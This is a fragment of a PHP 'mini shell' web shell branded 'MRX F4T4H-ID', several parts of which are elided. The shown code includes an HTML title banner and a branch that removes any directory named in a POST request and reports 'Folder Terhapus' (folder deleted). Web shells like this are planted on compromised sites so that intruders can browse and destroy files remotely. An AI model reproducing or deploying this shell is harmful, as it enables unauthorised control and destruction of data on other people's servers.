...
<title>Shell Mini By MRX F4T4H-ID</title>
<style>
body{
...
<body>
<h1><center><font color="blue">SHELL MINI By MRX F4T4H-ID</font></center></h1>
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Folder Terhapus</font><br/>';
}else{
